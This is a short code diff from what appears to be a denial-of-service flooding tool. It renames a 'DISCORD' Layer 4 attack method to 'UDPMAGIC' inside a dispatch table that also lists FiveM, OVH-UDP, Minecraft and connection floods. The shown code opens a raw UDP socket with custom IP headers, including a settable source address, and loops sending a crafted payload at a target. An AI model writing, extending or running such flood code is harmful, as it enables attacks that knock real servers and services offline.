@@ -55,7 +55,7 @@ class Layer4(Thread):
             "FIVEM": self.FIVEM,
             "FIVEM-TOKEN": self.FIVEMTOKEN,
             "OVH-UDP": self.OVHUDP, 
-            "DISCORD": self.DISCORD,
+            "UDP-MAGIC": self.UDPMAGIC,
             "MINECRAFT": self.MINECRAFT,
             "CPS": self.CPS,
             "CONNECTION": self.CONNECTION,
@@ -190,8 +190,8 @@ class Layer4(Thread):
                 continue
         Tools.safe_close(s)
 
-    def DISCORD(self) -> None:
-        payload = self._generate_discord()
+    def UDPMAGIC(self) -> None:
+        payload = self._generate_udpmagic()
         with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while Tools.sendto(s, payload, self._target):
@@ -280,7 +280,7 @@ class Layer4(Thread):
 
         return packets
 
-    def _generate_discord(self) -> bytes:
+    def _generate_udpmagic(self) -> bytes:
         ip: IP = IP()
         ip.set_ip_src(__ip__)
         ip.set_ip_dst(self._target[0])
